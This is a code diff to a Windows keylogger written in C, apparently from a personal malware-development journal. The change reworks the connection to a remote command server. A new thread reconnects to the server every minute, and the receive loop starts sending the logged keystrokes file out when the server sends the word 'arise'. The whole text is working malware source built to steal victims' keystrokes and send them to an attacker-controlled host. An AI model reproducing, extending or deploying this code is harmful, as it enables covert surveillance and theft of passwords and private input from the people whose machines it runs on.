@@ -9,6 +9,9 @@
 #define SERVER_PORT 2005
 #define BUF_SIZE 1024
 
+SOCKET sock;
+HANDLE hMutex;
+struct sockaddr_in server;
 DWORD WINAPI send_logs(LPVOID lpBuffer) {
     FILE *fp;
     char *filename = "C:\\Users\\blackrose\\Desktop\\MalDevJournal\\keylogger\\v1\\keylogger.txt";
@@ -33,43 +36,47 @@ DWORD WINAPI send_logs(LPVOID lpBuffer) {
     return 1;
 }
 
+DWORD WINAPI refresh_connection(LPVOID arg) {
+    while(1){
+        WaitForSingleObject(hMutex, INFINITE); 
+        int check = send(sock, "", strlen(""), 0);
+        if(!(check > 0)) {
+            closesocket(sock);
+            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+            server.sin_family = AF_INET;
+            server.sin_addr.s_addr = inet_addr(SERVER_IP);
+            server.sin_port = htons(SERVER_PORT);
+            while(connect(sock, (struct sockaddr *)&server, sizeof(server))) Sleep(1000);
+        }
+        ReleaseMutex(hMutex);
+        Sleep(60000);
+    }
+}
 
 
 DWORD WINAPI connect_to_server(LPVOID arg) {
     WSADATA wsaData;
-    SOCKET sock;
     WSAStartup(MAKEWORD(2, 2), &wsaData);
-    struct sockaddr_in server;
     char buffer[BUF_SIZE];
-    loop_back:
+    hMutex = CreateMutex(NULL,FALSE,NULL);
     sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     server.sin_family = AF_INET;
     server.sin_addr.s_addr = inet_addr(SERVER_IP);
     server.sin_port = htons(SERVER_PORT);
-    
-    while(1){
-        
-        int conn = 1;
-        while(conn){
-        
-        conn = connect(sock, (struct sockaddr *)&server, sizeof(server));
-        Sleep(1000);
+    // connect(sock, (struct sockaddr *)&server, sizeof(server));
+    HANDLE recieve, refresh_conn;
+    refresh_conn = CreateThread(NULL, 0, refresh_connection, NULL, NULL, NULL);
+    int len;
+    while(1 > 0) {
+        len = recv(sock, buffer, sizeof(buffer), 0);
+        if(sock == SOCKET_ERROR) Sleep(10000);
+        buffer[len] = 0;
+        if (strcmp(buffer, "arise") == 0) {
+            recieve = CreateThread(NULL, 0, send_logs, &sock, NULL, NULL);
         }
-        HANDLE recieve;
-        int len;
-        while((len = recv(sock, buffer, sizeof(buffer), 0)) > 0 && !conn) {
-            buffer[len] = 0;
-            if (strcmp(buffer, "arise") == 0) {
-                recieve = CreateThread(NULL, 0, send_logs, &sock, NULL, NULL);
-            }
-            if (sock == INVALID_SOCKET) {
-                closesocket(sock);
-                goto loop_back;
-            }
-        }
-            // Cleanup
-        closesocket(sock);
     }
+        // Cleanup
+    closesocket(sock);
     WSACleanup();
     return 1;
 }
